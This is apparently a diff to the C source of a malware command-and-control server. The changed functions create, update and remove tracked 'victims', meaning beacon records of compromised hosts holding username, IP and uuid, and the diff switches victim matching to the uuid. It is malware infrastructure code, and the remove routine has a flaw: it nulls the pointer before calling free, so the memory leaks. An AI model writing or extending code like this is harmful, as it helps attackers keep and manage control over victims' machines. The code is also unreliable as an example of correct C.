@@ -44,7 +44,6 @@ net_client_beacon_t **net_create_victims(){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     exit(EXIT_FAILURE);
   }
-  //memset(v, 0, count * sizeof(net_client_beacon_t));
   for (int i = 0; i < count; i++){
     v[i] = NULL;
   }
@@ -74,8 +73,7 @@ int net_update_victims(net_client_beacon_t *victim, net_client_beacon_t **p_vict
  */
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (p_victims[i] != NULL &&
-        (strcmp(p_victims[i]->sysinfo.username, victim->sysinfo.username) == 0) &&
-        (strcmp(p_victims[i]->sysinfo.ip, victim->sysinfo.ip) == 0)){
+        (strcmp(p_victims[i]->sysinfo.uuid, victim->sysinfo.uuid) == 0)){
       p_victims[i] = victim;
       return i;
     }
@@ -99,8 +97,7 @@ bool net_remove_victims(net_client_beacon_t *victim, net_client_beacon_t **p_vic
   */
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (p_victims[i] != NULL &&
-        (strcmp(p_victims[i]->sysinfo.username, victim->sysinfo.username) == 0) &&
-        (strcmp(p_victims[i]->sysinfo.ip, victim->sysinfo.ip) == 0)){
+        (strcmp(p_victims[i]->sysinfo.uuid, victim->sysinfo.uuid) == 0)){
       memset(p_victims[i], 0, sizeof(net_client_beacon_t));
       p_victims[i] = NULL;
       free(p_victims[i]);
